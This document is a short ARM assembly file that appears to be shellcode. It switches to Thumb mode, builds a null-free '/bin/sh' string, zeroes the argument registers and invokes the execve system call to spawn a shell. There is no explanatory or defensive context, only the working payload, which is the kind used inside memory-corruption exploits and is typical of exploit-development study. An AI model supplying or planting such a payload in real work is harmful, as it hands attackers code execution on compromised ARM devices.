.section .text
.global _start

_start:
  .ARM
  add r3, pc, #1
  bx r3

  .THUMB
  add r0, pc, #8
  eor r1, r1, r1
  eor r2, r2, r2
  strb r2, [r0, #7]
  mov r7, #11
  svc #1

.ascii "/bin/shx"
